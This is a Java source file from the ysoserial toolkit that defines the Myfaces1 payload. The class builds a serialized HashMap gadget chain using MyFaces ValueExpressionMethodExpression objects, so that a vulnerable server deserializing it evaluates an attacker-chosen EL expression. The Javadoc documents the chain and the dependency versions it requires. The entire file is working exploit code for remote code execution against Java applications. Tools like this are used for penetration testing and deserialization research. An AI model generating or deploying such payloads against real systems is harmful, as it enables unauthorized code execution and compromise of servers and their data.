package ysoserial.payloads;



import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicDependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.annotation.DynamicDependencies.Condition;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * 
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * 
 * Arguments:
 * - an EL expression to execute
 * 
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 * 
 * @author mbechler
 */
@DynamicDependencies( { 
	@Condition(
			condition = "System.getProperty('el') == null || 'apache'.equals(System.getProperty('el'))",
			deps = @Dependencies({
            	"commons-collections:commons-collections:3.2",
            	"commons-beanutils:commons-beanutils:1.8.3",
                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
                "org.mortbay.jasper:apache-el:8.0.27",
                "javax.servlet:javax.servlet-api:3.1.0",

                // deps for mocking the FacesContext
                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            })
	),
	@Condition(
			condition = "'juel'.equals(System.getProperty('el'))",
			deps = @Dependencies( {
            	"commons-collections:commons-collections:3.2",
            	"commons-beanutils:commons-beanutils:1.8.3",
                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
                "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
                "javax.servlet:javax.servlet-api:3.1.0",

                // deps for mocking the FacesContext
                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            })
	)
})
@PayloadTest(skip="Requires running MyFaces, no direct execution")
public class Myfaces1 implements ObjectPayload<Object> {

	@Bind private String command;
	
    /**
	 * @deprecated Use {@link #getObject()} instead
	 */
	public Object getObject ( String command ) throws Exception {
		return getObject();
	}


	public Object getObject ( ) throws Exception {
        return makeExpressionPayload(command);
    }

    public static Object makeExpressionPayload ( String expr ) throws IllegalArgumentException, IllegalAccessException, Exception  {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);

        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
        
        ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
        ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
        ValueExpressionMethodExpression e2 = new ValueExpressionMethodExpression(ve2);

        return Gadgets.makeMap(e2, e);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Myfaces1.class, args);
    }
}
